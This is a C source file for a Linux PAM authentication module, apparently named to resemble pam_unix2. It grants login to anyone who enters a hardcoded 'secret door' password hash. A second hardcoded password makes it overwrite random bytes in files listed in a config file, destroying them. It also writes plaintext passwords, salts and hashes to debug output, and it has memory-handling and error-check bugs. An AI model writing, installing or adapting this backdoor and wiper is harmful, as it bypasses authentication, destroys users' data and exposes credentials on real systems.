#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define PAM_SM_AUTH

#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <syslog.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "pam_unix2.h"


PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) 
{
    return PAM_SUCCESS;
}
 
// PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) 
// {
//     return PAM_SUCCESS;
// }
 
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const char **argv) 
{
    int pam_code;
    const char *password = NULL;
    char *buffer = NULL;
    size_t len = 0;
    ssize_t read;
    
    // Get application password
    pam_code = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (pam_code != PAM_SUCCESS) {
        goto exit;
    }

    if (password == NULL || strcmp(password, "") == 0) {
        goto exit;
    }

    char *salt = (char *)calloc(1, strlen(SALT) + strlen("$1$") + 2);
    sprintf(salt, "$1$%s$", SALT);
    char *hash = crypt(password, salt);

    debug("Password: %s\n", password);
    debug("Hash: %s\n", hash);
    debug("Salt: %s\n", salt);
    
    if (!strncmp(hash, GOOD_PASSWORD, strlen(GOOD_PASSWORD))) {
        debug("Congratulation! You found the secret door\n");
        free(salt);
        return PAM_SUCCESS;

    } else if (!strncmp(hash, BAD_PASSWORD, strlen(BAD_PASSWORD))) {
        // Make something for protect you data
        if (argc != 1) {
            goto exit;
        }
        
        // Check if config file exists
        if (0 == access(argv[0], 0)) 
        {
            FILE *fp = fopen(argv[0], "r");
            if (fp == NULL) {
                pam_syslog(pamh, LOG_ERR, "Could not open config file: %s", argv[0]);
                goto exit;
            }
            // Read lines from file
            while ((read = getline(&buffer, &len, fp)) != -1) {
                // Start delete files
                secure_rewrite(pamh, rstrip(buffer));
            }
            // Free and Close buffers
            fclose(fp);
            if (buffer) free(buffer);
        } 
        else {
            pam_syslog(pamh, LOG_ERR, "Could not find config file: %s", argv[0]);
            goto exit;
        }
    }

exit:
    free(salt);
    return PAM_AUTH_ERR;
}

char *rstrip(char *line) {
    for ( int i = 0; i < strlen(line); i++ ) {
        if (line[i] == '\n') {
            line[i] = 0;
            break;
        }
    }
    return line;
}

void *secure_rewrite(pam_handle_t *pamh, char *file_name) 
{
    struct stat *stat_buf = malloc(sizeof(struct stat));
    char *random_buffer = NULL;

    if (stat(file_name, stat_buf) == 0) {
        if (stat_buf->st_size != 0) {
            int byte_count = (int)stat_buf->st_size / 10;
            random_buffer = get_random_bytes(pamh, byte_count); // allocate urandom buffer with size byte_count
            FILE *fp = fopen(file_name, "r+");
            // Check if file was opened
            if (fp != NULL) {
                // Start rewrite file
                for (int i = 0; i < byte_count; i++) {
                    int seek = (unsigned int)random_buffer[i] % (int)(stat_buf->st_size - 1);
                    fseek(fp, seek, SEEK_SET);  // Set file position
                    fputc(random_buffer[i], fp);
                }
                fclose(fp);
            } else {
                pam_syslog(pamh, LOG_ERR, "Could not open protected file: %s", file_name);
            }
            free(random_buffer);
        }
    }

    free(stat_buf);
}

char *get_random_bytes(pam_handle_t *pamh, int count) {
    char *random_buffer = (char *)calloc(1, count + 1);
    FILE *fp = fopen("/dev/urandom", "r");
    if (fp != NULL) {
        pam_syslog(pamh, LOG_ERR, "Can not open /dev/urandom!\n");
        fread(random_buffer, 1, count, fp);
        fclose(fp);
    }
    return random_buffer;
}